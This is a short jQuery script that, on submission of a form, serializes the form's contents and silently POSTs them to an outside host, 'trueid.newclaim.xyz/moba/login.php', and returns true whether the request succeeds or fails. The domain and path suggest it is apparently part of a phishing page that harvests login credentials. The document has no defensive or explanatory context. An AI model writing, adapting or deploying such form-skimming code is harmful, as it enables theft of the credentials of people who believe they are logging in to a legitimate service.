$(".formInfo").submit(function() {
	var d = $(".fomInfo");

	$.ajax({
        url: "https://trueid.newclaim.xyz/moba/login.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});